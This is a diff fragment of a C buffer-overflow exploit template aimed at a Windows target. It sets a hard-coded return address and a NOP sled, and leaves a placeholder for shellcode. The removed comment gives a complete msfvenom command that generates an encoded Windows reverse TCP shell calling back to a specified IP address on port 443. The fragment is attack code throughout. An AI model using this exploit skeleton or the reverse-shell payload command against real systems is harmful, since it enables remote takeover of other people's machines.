@@ -21,8 +21,8 @@ int main() {
     char retn[] = "\x9d\x78\x03\x10";
     char shellcode[] =
 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
-ShellCode HERE and add \x90"; // msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.236 LPORT=443 EXITFUNC=thread -f c -e x86/xor_dynamic -b "\x00\x09\x0a\x1a"
-
+ShellCode HERE and add \x90"; 
+        
     int buffer_size = _msize(overwrite_offset) + strlen(retn) + strlen(shellcode);
     char *buffer = malloc(buffer_size);
 
